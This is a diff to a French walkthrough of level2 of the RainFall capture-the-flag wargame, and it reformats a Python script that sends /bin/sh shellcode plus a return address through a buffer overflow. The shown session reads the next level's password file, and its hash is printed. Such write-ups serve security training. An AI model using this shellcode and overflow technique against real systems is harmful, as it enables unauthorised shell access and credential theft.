@@ -79,6 +79,7 @@ Nous utiliserons 080484cf.
 
 Nous avons notre offset (80), l’adresse d’une instruction qui appelle EAX (80484cf), un shellcode … Let’s do it :
 
+****************************************************************************************************
 #!/usr/bin/env python
 
 shellcode="\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89
@@ -88,17 +89,17 @@ shellcode="\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\
 payload=shellcode+(80-len(shellcode))*"A"+"\xcf\x84\x04\x08"
 
 print payload
+****************************************************************************************************
 
 level2@RainFall:~$ python script > hack
-
 level2@RainFall:~$ cat test - | ./level2
 1��F1�1�̀�[1��C��C
                  �
                   ��S
                       ̀�����/bin/shNAAAABBBBAAAAAAAAAAAAAAAAAAAAA�
-whoami
-level3
-cat /home/user/level3/.pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+#whoami
+#level3
+#cat /home/user/level3/.pass
+#492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
 Next …
